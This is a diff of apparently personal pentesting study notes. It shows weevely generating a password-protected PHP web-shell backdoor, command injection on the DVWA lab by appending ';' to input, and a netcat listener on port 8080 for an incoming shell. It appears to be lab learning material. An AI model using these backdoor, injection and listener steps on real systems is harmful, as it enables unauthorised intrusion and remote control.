@@ -54,3 +54,26 @@ weevely generate 123456 /root/shell.php
 - `weevely (respective url) 123456`
 - now from the terminal we can open the backdoor that is  `cd ..` to get back and then we can access as we want.
 - burpsuite is used to interpt the website being executed with the help of proxy.
+
+<h3 align="center"> ... </h3> 
+
+## Code Execution Vulnerability
+- open any searchable website (dvwa- command execution)
+- search for any thing and at last __END WITH ";" AND RUN THE COMMAND ACCORDING TO THE WEBSITE OS__
+- __MOST IMPORTANT IF THE IP IS 192.168.11.129, SUBTRACT THE LAST NUMBER -1 THAT IS 192.168.11.128__
+![Screenshot 2024-04-09 232801](https://github.com/stellados53/kali_commands/assets/142677726/7d1cc4d5-5310-4934-84ba-2c44d0124a0e)
+
+- run the following command
+```
+nc -vv -l -p 8080
+```
+
+> nc   = netcat tool this is used to use and connect the computer to the website.
+> 
+> -vv  = it is just a verbose mode, which retireve more output.
+> 
+> -l   = Listen mode, used to create a server that listens for incoming connections.
+> 
+> -p   = Specifies the source port number.
+> 
+> 8080 = port number.
